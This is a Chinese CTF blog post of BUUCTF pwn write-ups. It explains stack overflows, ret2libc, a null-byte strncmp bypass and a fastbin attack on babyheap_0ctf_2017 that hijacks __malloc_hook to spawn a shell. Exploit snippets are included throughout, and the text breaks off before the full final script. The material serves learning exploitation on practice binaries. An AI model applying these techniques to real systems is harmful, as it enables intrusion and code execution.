<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>BUUCTF Pwn 练习 - Lab on Mercury</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Lab on Mercury"><meta name="msapplication-TileImage" content="/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Lab on Mercury"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="从今天起，我也是Pwn🐕了。"><meta property="og:type" content="blog"><meta property="og:title" content="BUUCTF Pwn 练习"><meta property="og:url" content="https://signormercurio.me/post/BUUPwn/"><meta property="og:site_name" content="Lab on Mercury"><meta property="og:description" content="从今天起，我也是Pwn🐕了。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://signormercurio.me/img/og_image.png"><meta property="article:published_time" content="2019-12-14T13:46:20.000Z"><meta property="article:author" content="Mercury"><meta property="article:tag" content="栈迁移"><meta property="article:tag" content="整数溢出"><meta property="article:tag" content="ROP"><meta property="article:tag" content="fastbin-attack"><meta property="article:tag" content="mprotect"><meta property="article:tag" content="SROP"><meta property="article:tag" content="tcache"><meta property="article:tag" content="off-by-one"><meta property="article:tag" content="unlink"><meta property="article:tag" content="fastbin-consolidation"><meta property="article:tag" content="mmap_thresold"><meta property="article:tag" content="House-of-Force"><meta property="article:tag" content="House-of-Spirit"><meta property="article:tag" content="largebin-attack"><meta property="article:tag" content="House-of-Orange"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://signormercurio.me/post/BUUPwn/"},"headline":"Lab on Mercury","image":["https://signormercurio.me/img/og_image.png"],"datePublished":"2019-12-14T13:46:20.000Z","author":{"@type":"Person","name":"Mercury"},"description":"从今天起，我也是Pwn🐕了。"}</script><link rel="canonical" href="https://signormercurio.me/post/BUUPwn/"><link rel="alternate" href="/atom.xml" title="Lab on Mercury" type="application/atom+xml"><link rel="icon" href="/img/favicon.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/favicon.png" alt="Lab on Mercury" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2019-12-14T13:46:20.000Z" title="2019-12-14T13:46:20.000Z">2019-12-14</time></span><span class="level-item"><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/">安全</a><span> / </span><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/Pwn/">Pwn</a></span><span class="level-item">an hour read (About 10274 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">BUUCTF Pwn 练习</h1><div class="content"><p>从今天起，我也是Pwn🐕了。</p>
<a id="more"></a>

<h2 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h2><p>nc 直接连，<code>cat flag</code>。</p>
<h2 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h2><p>栈溢出，可直接覆盖返回地址，注意 64 位：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0xf</span>+<span class="number">8</span>) + p64(elf.symbols[<span class="string">&#x27;fun&#x27;</span>])</span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure>

<h2 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h2><p>和上题其实一样，程序中存在后门，直接返回过去。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x40</span>+<span class="number">8</span>) + p64(<span class="number">0x40060d</span>)</span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure>

<h2 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h2><p>直接运行几次或者源码审计可以发现是将输入的<code>I</code>替换为<code>you</code>，其余的其实和上面一样：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;I&#x27;</span>*(<span class="number">0x3c</span> // <span class="number">3</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>+p32(elf.symbols[<span class="string">&#x27;get_flag&#x27;</span>])</span><br><span class="line">sl(payload)</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h2><p>开启了 NX 保护，并且有未限制长度的<code>gets</code>，基本上可以确定是 ROP 栈溢出。IDA 搜一下 string，可以发现有 libc 可以用，考虑 ret2libc。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">payload</span>):</span></span><br><span class="line">	ru(<span class="string">&#x27;!\n&#x27;</span>)</span><br><span class="line">	sl(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	ru(<span class="string">&#x27;ed\n&#x27;</span>)</span><br><span class="line">	sl(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>,pop_rdi,elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>],elf.plt[<span class="string">&#x27;puts&#x27;</span>],elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">send(payload)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;@\n&#x27;</span>)</span><br><span class="line">leak = uu64(r(<span class="number">6</span>))</span><br><span class="line">system,binsh = ret2libc(leak, <span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x58</span>,pop_rdi,binsh,system)</span><br><span class="line">send(payload)</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h2><p>依然是最简单的无保护<code>gets</code>并且程序中有<code>system(&quot;cat /flag&quot;)</code>，找到后者地址返回过去即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">cat_flag = <span class="number">0x4006be</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">payload</span>):</span></span><br><span class="line">	ru(<span class="string">&#x27;number.\n&#x27;</span>)</span><br><span class="line">	sl(payload)</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>, cat_flag)</span><br><span class="line">send(payload)</span><br></pre></td></tr></table></figure>

<h2 id="ciscn-2019-en-2"><a href="#ciscn-2019-en-2" class="headerlink" title="ciscn_2019_en_2"></a>ciscn_2019_en_2</h2><p>和上上题一样。</p>
<h2 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+Bh] [ebp-Dh]</span></span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  sub_80486BB();</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &gt; <span class="number">0</span> )</span><br><span class="line">    read(fd, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v2 = sub_804871F(buf);</span><br><span class="line">  sub_80487D0(v2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>main</code>中<code>sub_80486BB</code>用于初始化，然后将一个随机数传入<code>sub_804871F</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">sub_804871F</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+Ch] [ebp-4Ch]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">7</span>]; <span class="comment">// [esp+2Ch] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 v5; <span class="comment">// [esp+33h] [ebp-25h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x20</span>u);</span><br><span class="line">  <span class="built_in">sprintf</span>(&amp;s, <span class="string">&quot;%ld&quot;</span>, a1);</span><br><span class="line">  v6 = read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">  buf[v6 - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(buf);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(buf, &amp;s, v1) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Correct\n&quot;</span>, <span class="number">8u</span>);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的<code>a1</code>就是传入的随机数，然后要求我们的输入和随机数经过<code>strncmp</code>比较后完全相同，我们可以输入<code>\x00</code>使得<code>strlen</code>函数返回 0，从而使得<code>strncmp</code>函数只比较 0 个字节，那么就能绕过这里的<code>exit(0)</code>，并返回<code>v5</code>。注意到这里的返回值<code>v5</code>在<code>ebp-0x25</code>，距离我们能控制的位于<code>ebp-0x2c</code>的变量<code>buf</code>相差<code>0x7</code>，小于这里<code>read</code>的长度限制<code>0x20</code>，因此可以通过栈溢出控制<code>v5</code>的值，从而控制<code>main</code>中的<code>v2</code>。</p>
<p>随后，<code>v2</code>会被传入<code>sub_80487D0</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __cdecl <span class="title">sub_80487D0</span><span class="params">(<span class="keyword">char</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+11h] [ebp-E7h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">127</span> )</span><br><span class="line">    result = read(<span class="number">0</span>, &amp;buf, <span class="number">0xC8</span>u);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    result = read(<span class="number">0</span>, &amp;buf, a1);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>a1</code>就是我们可以控制的<code>v2</code>，也就是说这里可以向<code>buf</code>写入的数据长度也是我们能控制的，那么我们希望它尽可能大，也就是等于<code>0xff</code>。那么在上一个函数中我们就需要令<code>v5</code>为<code>0xff</code>，结合上面的绕过，可以输入<code>&#39;\x00&#39; + 6*&#39;a&#39; + &#39;\xff&#39;</code>来达到这个目的。最后<code>ret2libc</code>即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send1</span>():</span></span><br><span class="line">	payload = flat(<span class="string">&#x27;\x00&#x27;</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">6</span>,<span class="string">&#x27;\xff&#x27;</span>)</span><br><span class="line">	sl(payload)</span><br><span class="line">	ru(<span class="string">&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">send1()</span><br><span class="line">main = <span class="number">0x8048825</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>),elf.plt[<span class="string">&#x27;write&#x27;</span>],main,<span class="number">1</span>,elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>],<span class="number">4</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">leak = u32(r(<span class="number">4</span>))</span><br><span class="line">system,binsh = ret2libc(leak, <span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">send1()</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*(<span class="number">0xe7</span>+<span class="number">4</span>),system,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,binsh)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<h2 id="babyheap-0ctf-2017"><a href="#babyheap-0ctf-2017" class="headerlink" title="babyheap_0ctf_2017"></a>babyheap_0ctf_2017</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; Baby Heap in 2017 &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">1. Allocate</span><br><span class="line">2. Fill</span><br><span class="line">3. Free</span><br><span class="line">4. Dump</span><br><span class="line">5. Exit</span><br></pre></td></tr></table></figure>

<p>分配内存使用了<code>calloc</code>，每次分配会先清空一下这块内存，大小限制是 4096B。填充时直接读取用户输入，没有检查长度，因此可以堆溢出。除了 canary 外保护全开，因此考虑泄露 libc。如何泄露？</p>
<p>当只有一个 small bin/large bin 被释放时，其<code>fd</code>与<code>bk</code>指向<code>main_arena</code>中的地址，而后者是 libc 的一个全局变量，因此可以通过它泄露出 libc 基址。</p>
<p>首先分配 4 个 fast chunk 和 1 个 small chunk（不妨分别称为<code>a,b,c,d,e</code>），然后释放<code>b</code>，它将被加入 fast bin 顶部。此时再释放<code>c</code>，那么<code>c</code>也会加入 fast bin 顶部，并且它的<code>fd</code>指向<code>b</code>。此时有：<code>freelist-&gt;c-&gt;b</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">	alloc(<span class="number">0x10</span>) <span class="comment"># a0,b1,c2,d3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># e4</span></span><br><span class="line">free(<span class="number">1</span>) <span class="comment"># b</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># c</span></span><br></pre></td></tr></table></figure>

<p>这样就可以进行 fastbin attack。利用<code>Fill</code>堆溢出修改<code>c</code>的<code>fd</code>为<code>e</code>的地址（我们需要从未被释放的<code>a</code>开始填充，所以刚才不是从<code>a</code>开始释放），随后第一次<code>Allocate</code>拿到<code>c</code>，第二次<code>Allocate</code>就能拿到<code>e</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># c-&gt;fd = e</span></span><br><span class="line">payload = flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x21</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x21</span>,<span class="string">&#x27;\x80&#x27;</span>])</span><br><span class="line">fill(<span class="number">0</span>, payload)</span><br></pre></td></tr></table></figure>

<p>注意这里 payload 的前三个<code>0</code>用于填充<code>a</code>中<code>0x10</code>字节的用户数据和<code>b</code>中<code>0x8</code>字节的<code>prev_size</code>字段，后面同理。<code>0x21</code>是<code>a/b/c/d</code>的<code>chunk_size</code>，<code>0x80</code>是<code>e</code>的地址低 8 位，都可以通过 gdb 调试得到。</p>
<blockquote>
<p>注：<code>0x21</code>低位的<code>1</code>表示<code>PREV_INUSE</code>，这和 fast bin 中 chunk 的 P 位不变是一致的。</p>
</blockquote>
<p>然而这里存在一个安全检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fastbin_index(sz) \</span></span><br><span class="line">  ((((<span class="keyword">unsigned</span> <span class="keyword">int</span>) (sz)) &gt;&gt; (SIZE_SZ == <span class="number">8</span> ? <span class="number">4</span> : <span class="number">3</span>)) - <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx, <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">errout:</span><br><span class="line">    malloc_printerr (check_action, errstr, chunk2mem (victim), av);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>检查我们拿到的 chunk 的大小是否在对应索引的 fast bin 范围内。所以我们还需要修改<code>e</code>的<code>chunk_size</code>字段，方法同样是堆溢出。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># e-&gt;chunk_size = 0x21</span></span><br><span class="line">payload = flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x21</span>])</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br></pre></td></tr></table></figure>

<p>这里通过<code>d</code>溢出到<code>e</code>的<code>chunk_size</code>并覆盖上了<code>0x21</code>，gdb 调试得到其索引为<code>2</code>。</p>
<p>修改完成后才可以进行两次<code>alloc(0x10)</code>从而拿到<code>e</code>。拿到<code>e</code>后再释放掉它就可以获得其<code>fd</code>与<code>bk</code>，但这里有两个问题：</p>
<ol>
<li>前面对其<code>chunk_size</code>的修改会导致释放时<code>e</code>进入 fast bin，拿不到<code>fd</code>和<code>bk</code>。</li>
<li><code>e</code>被释放后与 top chunk 相邻，必定会被合并。</li>
<li><code>fd</code>和<code>bk</code>到底指向哪里？</li>
</ol>
<p>解答：</p>
<ol>
<li>把<code>e</code>的<code>chunk_size</code>恢复即可。</li>
<li>释放<code>e</code>前再多申请一个 small chunk 使得<code>e</code>不与 top chunk 相邻。</li>
<li><code>e</code>被释放后进入 unsorted bin，所以其<code>fd</code>与<code>bk</code>都指向 unsorted bin 的链表头，注意其地址到 libc 基址的偏移是固定的<code>0x3c4b78</code>。</li>
</ol>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># e-&gt;chunk_size = 0x91</span></span><br><span class="line">payload = flat([<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x91</span>])</span><br><span class="line">fill(<span class="number">3</span>, payload)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment"># f5</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># e, e-&gt;fd = unsorted_head</span></span><br><span class="line"></span><br><span class="line">base = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])<span class="number">-0x3c4b78</span></span><br></pre></td></tr></table></figure>

<p>最后的<code>dump(2)</code>就是打印索引为<code>2</code>的 chunk，也就是<code>e</code>，从而得到<code>e</code>的<code>fd</code>和<code>bk</code>。</p>
<p>之后，再次使用 fast bin attack 将 libc 中函数，例如<code>__malloc_hook</code>放入 fast bin，然后用<code>malloc</code>返回给我们，就可以实现类似 GOT 劫持的效果。<code>__malloc_hook</code>只要非空，就会在<code>malloc</code>时被调用，我们让它指向<code>one_gadget</code>找到的一个 gadget 即可，比如可以用距离 libc 基址 0x4526a 的 gadget。</p>
<p>但是同样的，我们需要绕过上面的安全检查。幸运的是，该检查对于对齐没有任何要求。通过 gdb 调试我们发现在<code>__malloc_hook</code>附近的<code>_IO_wide_data_0+304</code>位置其高位字节为<code>7f</code>而低位字节含有连续的<code>00</code>，因此可以通过增加一些偏移获得<code>0x7f</code>这个数值作为<code>chunk_size</code>，恰好能通过检查。</p>
<p>如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;32xg (long long)(&amp;main_arena)-0x40</span><br><span class="line">0x7f16d95deae0 &lt;_IO_wide_data_0+288&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f16d95deaf0 &lt;_IO_wide_data_0+304&gt;:	0x00007f16d95dd260	0x0000000000000000</span><br><span class="line">0x7f16d95deb00 &lt;__memalign_hook&gt;:	0x00007f16d929fe20	0x00007f16d929fa00</span><br><span class="line">0x7f16d95deb10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>我们加 13 字节偏移（循环右移），成功伪造<code>chunk_size</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;32xg (long long)(&amp;main_arena)-0x40+0xd</span><br><span class="line">0x7f16d95deaed &lt;_IO_wide_data_0+301&gt;:	0x16d95dd260000000	0x000000000000007f</span><br><span class="line">0x7f16d95deafd:	0x16d929fe20000000	0x16d929fa0000007f</span><br><span class="line">0x7f16d95deb0d &lt;__realloc_hook+5&gt;:	0x000000000000007f	0x0000000000000000</span><br><span class="line">0x7f16d95deb1d:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p><code>0x7f</code>对应的<code>malloc</code>请求大小大约是<code>0x60</code>。现在，freelist 顶部是<code>e</code>，于是<code>alloc(0x60)</code>就会分配总大小为<code>0x71</code>、起点与<code>e</code>相同、且索引为<code>4</code>的 chunk<code>g</code>，这时再<code>free</code>掉<code>g</code>就会使得<code>g</code>位于 freelist 顶部。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># g4</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># g</span></span><br></pre></td></tr></table></figure>

<p>接下来修改索引为<code>2</code>的 chunk 的<code>fd</code>（实际就是为了修改<code>e</code>或者说<code>g</code>的<code>fd</code>）指向<code>_IO_wide_data_0+301</code>地址，然后第一次<code>Allocate</code>得到<code>g</code>位于索引<code>5</code>，第二次<code>Allocate</code>得到指向<code>_IO_wide_data_0+301</code>的指针，位于索引<code>6</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># g-&gt;fd = _IO()</span></span><br><span class="line">payload = p64(base+<span class="number">0x3c4aed</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># g5</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment"># _IO()6</span></span><br></pre></td></tr></table></figure>

<p>而由上面的 gdb 分析可知得到的指针位于<code>0xaed</code>，<code>__malloc_hook</code>位于<code>0xb10</code>（PIE 下低 12 位固定），相差<code>0x13</code>。因此填充<code>0x13</code>字节的 padding 后再放上 getshell 的 gadget 地址即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _IO() + 13 == __malloc_hook(), one_gadget</span></span><br><span class="line">payload = flat([<span class="string">&#x27;\x00&#x27;</span>*<span class="number">0x13</span>, base+<span class="number">0x4526a</span>])</span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br></pre></td></tr></table></figure>

<p>最后不要忘记再申请一次任意大小内存以调用<code>__malloc_hook</code>。完整 exp，注意最后一次 alloc 返回得有点慢，<code>recvuntil</code>最好加一个<code>timeout</code>：</p>
